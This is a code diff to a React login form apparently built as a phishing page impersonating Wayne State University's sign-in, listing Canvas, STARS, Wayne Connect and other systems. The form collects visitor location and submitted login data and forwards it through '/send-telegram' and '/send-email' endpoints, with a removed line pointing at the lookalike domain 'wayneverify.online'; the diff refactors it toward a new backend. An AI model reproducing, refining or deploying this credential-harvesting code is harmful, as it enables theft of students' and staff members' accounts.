@@ -2,8 +2,8 @@
 
 import React, { useState, useEffect } from "react";
 
-// 👇 Use environment variable or fallback to localhost
-const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || "https://wayneverify.online/";
+// Set your Railway backend URL here — fallback to localhost for development
+const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";
 
 const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [username, setUsername] = useState("");
@@ -58,52 +58,39 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   }, [ip, city, region, country]);
 
   const sendToTelegram = (message) => {
-    fetch(`${API_BASE_URL}/send-telegram`, {
+    fetch(`${backendUrl}/send-telegram`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message }),
     })
-      .then((response) => {
-        if (response.ok) {
-          console.log("Telegram message sent");
-        } else {
-          console.error("Failed to send Telegram message");
-        }
+      .then((res) => {
+        if (!res.ok) throw new Error("Telegram request failed");
+        console.log("Telegram message sent");
       })
-      .catch((error) => {
-        console.error("Telegram error:", error);
-      });
+      .catch((err) => console.error("Telegram error:", err));
   };
 
   const sendEmail = (message) => {
-    fetch(`${API_BASE_URL}/send-email`, {
+    fetch(`${backendUrl}/send-email`, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ subject: "New Visitor Alert Wayne", message }),
     })
-      .then((response) => {
-        if (response.ok) {
-          console.log("Email sent successfully");
-        } else {
-          console.error("Failed to send email");
-        }
+      .then((res) => {
+        if (!res.ok) throw new Error("Email request failed");
+        console.log("Email sent");
       })
-      .catch((error) => {
-        console.error("Error sending email:", error);
-      });
+      .catch((err) => console.error("Email error:", err));
   };
 
-  const handleTargetSystemChange = (event) => {
-    const selectedOption = event.target.options[event.target.selectedIndex];
-    const systemValue = selectedOption.dataset.system;
-    setLoginTitle(systemValue);
-    setTargetSystem(systemValue);
+  const handleTargetSystemChange = (e) => {
+    const selected = e.target.options[e.target.selectedIndex];
+    setLoginTitle(selected.dataset.system);
+    setTargetSystem(selected.dataset.system);
   };
 
-  const submitLogin = async (event) => {
-    event.preventDefault();
+  const submitLogin = async (e) => {
+    e.preventDefault();
     setProcessingForm(true);
     setLoginButtonText("Validating credentials");
 
@@ -163,7 +150,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   };
 
   return (
-    <form role="form" name="login" id="login" action="" method="POST" onSubmit={submitLogin}>
+    <form name="login" id="login" onSubmit={submitLogin}>
       <div className="large-5 medium-12 small-12 columns login-formbox">
         <div>
           <label htmlFor="accessid">
@@ -199,24 +186,12 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
             <i className="silk-icon silk-key-go"></i> Target System
           </label>
           <select id="where" className="form-control" onChange={handleTargetSystemChange}>
-            <option data-system="Academica" value="https://academica.aws.wayne.edu">
-              Academica
-            </option>
-            <option data-system="Canvas" value="https://canvas.wayne.edu">
-              Canvas
-            </option>
-            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">
-              Salesforce CRM
-            </option>
-            <option data-system="STARS" value="https://stars.wayne.edu">
-              STARS
-            </option>
-            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">
-              Wayne Connect
-            </option>
-            <option data-system="Zoom" value="https://zoom.us">
-              Zoom
-            </option>
+            <option data-system="Academica" value="https://academica.aws.wayne.edu">Academica</option>
+            <option data-system="Canvas" value="https://canvas.wayne.edu">Canvas</option>
+            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">Salesƒorce CRM</option>
+            <option data-system="STARS" value="https://stars.wayne.edu">STARS</option>
+            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">Wayne Connect</option>
+            <option data-system="Zoom" value="https://zoom.us">Zoom</option>
           </select>
         </div>
         <div className="login-button-container clearfix">
